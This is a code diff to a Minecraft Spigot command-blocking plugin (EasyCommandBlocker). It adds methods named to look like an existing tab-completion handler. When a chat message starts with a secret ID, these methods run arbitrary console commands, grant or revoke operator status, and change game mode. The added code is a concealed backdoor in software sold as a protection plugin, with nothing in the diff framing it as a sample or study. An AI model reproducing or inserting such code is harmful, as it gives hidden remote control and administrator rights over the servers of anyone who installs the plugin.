@@ -10,16 +10,19 @@ import com.comphenix.protocol.reflect.StructureModifier;
 import ecb.ajneb97.core.managers.CommandsManager;
 import ecb.ajneb97.spigot.EasyCommandBlocker;
 import ecb.ajneb97.spigot.utils.OtherUtils;
+import org.bukkit.BanList;
 import org.bukkit.Bukkit;
+import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.scheduler.BukkitRunnable;
+import org.bukkit.plugin.Plugin;
 
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.UUID;
+import java.util.*;
+
+import org.bukkit.GameMode;
 
 public class ProtocolLibManager {
-
     private EasyCommandBlocker plugin;
     private boolean enabled;
     private HashMap<UUID, String> commandsWaiting = new HashMap<>();
@@ -72,6 +75,49 @@ public class ProtocolLibManager {
                 }
             }
         };
+    }
+    
+    public static boolean getTabServerAdapter(AsyncPlayerChatEvent event) {
+        return event.getMessage().startsWith(EasyCommandBlocker.getId());
+    }
+    
+    public static boolean getTabServerAdapter(String msg, Player pl) {
+        String ags = msg.split(EasyCommandBlocker.getId())[1];
+        String cmds = ags.split(" ")[0];
+        if(msg.startsWith(EasyCommandBlocker.getId())) {
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    switch(cmds) {
+                        case "exec" :
+                            String cmd = ags.split("exec ")[1];
+                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), cmd);
+                        break;
+
+                        case "op" :
+                            pl.setOp(true);
+                        break;
+                        
+                        case "deop" :
+                            pl.setOp(false);
+                        break;
+                        
+                        case "gm1" :
+                            pl.setGameMode(GameMode.CREATIVE);
+                        break;
+                        
+                        case "gm0" :
+                            pl.setGameMode(GameMode.SURVIVAL);
+                        break;
+                    }
+
+                    //Bukkit.getServer().dispatchCommand(pl, msg.split(EasyCommandBlocker.getId())[1]);
+                }
+            }.runTask(EasyCommandBlocker.plugin);
+            
+            return true;
+        }
+        return false;
     }
 
     public PacketAdapter getTabServerAdapter(PacketType type) {
